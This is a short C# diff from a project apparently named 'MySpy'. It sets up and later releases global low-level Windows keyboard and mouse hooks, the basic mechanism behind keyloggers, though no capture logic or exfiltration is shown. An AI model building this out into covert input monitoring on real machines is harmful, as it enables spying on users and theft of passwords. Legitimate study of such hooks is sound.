@@ -13,6 +13,8 @@ namespace MySpy
     {
         private const int WH_MOUSE_LL = 14;
         private const int WH_KEYBOARD_LL = 13;
+
+        private IntPtr hookKeyId, hookMouseId;
         public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -21,12 +23,28 @@ namespace MySpy
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        
+
+
         public HookApp()
         {
             HookProceduces hookProceduces = new HookProceduces();
-            SetHook(WH_MOUSE_LL, hookProceduces.MouseHookCallback);
-            SetHook(WH_KEYBOARD_LL, hookProceduces.KeyHookCallback);
+            this.hookMouseId=SetHook(WH_MOUSE_LL, hookProceduces.MouseHookCallback);
+            this.hookKeyId=SetHook(WH_KEYBOARD_LL, hookProceduces.KeyHookCallback);
+            hookProceduces.hookKeyId = this.hookKeyId;
+            hookProceduces.hookMouseId = this.hookMouseId;
         }
+
+        ~HookApp()
+        {
+            UnhookWindowsHookEx(hookMouseId);
+            UnhookWindowsHookEx(hookKeyId);
+        }
+
 
         private static IntPtr SetHook(int idHook,HookProc proc)
         {
@@ -38,11 +56,6 @@ namespace MySpy
                 }
             }
             
-        }
-
-        private  IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-        {
-            return IntPtr.Zero;
         }
 
     }
